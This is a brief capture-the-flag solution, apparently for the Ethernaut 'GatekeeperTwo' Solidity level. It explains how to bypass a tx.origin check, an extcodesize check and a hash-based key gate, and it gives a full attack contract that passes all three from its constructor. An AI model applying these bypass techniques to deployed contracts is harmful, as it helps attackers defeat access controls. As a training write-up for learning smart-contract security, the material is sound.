gateOne: can be bypassed by using a contract so that `tx.origin != msg.sender`

gateTwo: `extcodesize` will return 0 if called from a contract's constructor

gateThree: key is `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ (uint64(0) - 1)`

```
contract GatekeeperTwo {
    function enter(bytes8 _gateKey) public returns (bool) {}
}

contract HackGatekeeperTwo {
  constructor(address instance) {
    GatekeeperTwo gk2 = GatekeeperTwo(instance);

    uint64 a = uint64(bytes8(keccak256(abi.encodePacked(this))));
    uint64 b = uint64(0) - 1;
    bytes8 key =  bytes8(a ^ b);

    gk2.enter(key);
  }
}
```
